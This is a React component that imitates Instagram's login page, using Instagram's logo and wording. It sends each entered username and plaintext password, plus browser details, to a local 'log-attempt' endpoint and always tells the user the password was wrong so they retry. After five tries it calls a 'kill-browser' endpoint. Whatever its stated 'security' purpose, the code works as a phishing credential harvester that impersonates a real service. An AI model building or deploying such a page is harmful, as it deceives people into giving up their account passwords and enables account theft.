import React, { useState } from 'react';

const InstagramLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const maxAttempts = 5;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await fetch('http://127.0.0.1:5001/api/security/log-attempt', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          password,
          success: false,
          source: 'instagram_web',
          details: {
            browser: navigator.userAgent,
            platform: navigator.platform,
            attempt_number: attemptCount + 1,
          },
        }),
      });

      setAttemptCount((prev) => prev + 1);

      if (!response.ok) {
        if (response.status === 403 || attemptCount + 1 >= maxAttempts) {
          await killBrowser();
        } else {
          setError('Sorry, your password was incorrect. Please double-check your password.');
          setPassword('');
        }
      } else {
        setError('Sorry, your password was incorrect. Please double-check your password.');
        setPassword('');
      }
    } catch (e) {
      if (attemptCount + 1 >= maxAttempts) {
        await killBrowser();
      } else {
        setError('An error occurred. Please try again.');
      }
    } finally {
      setLoading(false);
    }
  };

  const killBrowser = async () => {
    setLoading(true);
    try {
      const response = await fetch('http://127.0.0.1:5001/api/security/kill-browser', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
      });
      if (!response.ok) {
        throw new Error('Failed to terminate browser');
      }
    } catch (e) {
      // Fallback: crash the browser (not possible in React, so just show error)
      setError('Browser termination failed.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white border border-gray-300 rounded-md p-8 w-full max-w-sm text-center shadow-lg">
        <img
          src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
          alt="Instagram"
          className="mx-auto my-6 w-44"
        />
        <form onSubmit={handleSubmit} className={loading ? 'pointer-events-none opacity-70' : ''}>
          <input
            type="text"
            className="block w-full mb-2 px-2 py-2 border border-gray-300 rounded bg-gray-50 focus:outline-none focus:border-blue-400"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
            disabled={loading}
          />
          <input
            type="password"
            className="block w-full mb-2 px-2 py-2 border border-gray-300 rounded bg-gray-50 focus:outline-none focus:border-blue-400"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            disabled={loading}
          />
          <button
            type="submit"
            className={`w-full py-2 mt-2 rounded font-semibold text-white transition-colors ${loading ? 'bg-blue-300 cursor-not-allowed' : 'bg-blue-500 hover:bg-blue-600'}`}
            disabled={loading}
          >
            {loading ? (
              <span className="flex items-center justify-center">
                <span className="animate-spin inline-block w-5 h-5 border-2 border-gray-200 border-t-blue-500 rounded-full mr-2"></span>
                Logging In...
              </span>
            ) : (
              'Log In'
            )}
          </button>
        </form>
        {error && (
          <div className="text-red-500 text-sm mt-4">
            {error}
          </div>
        )}
      </div>
    </div>
  );
};

export default InstagramLogin; 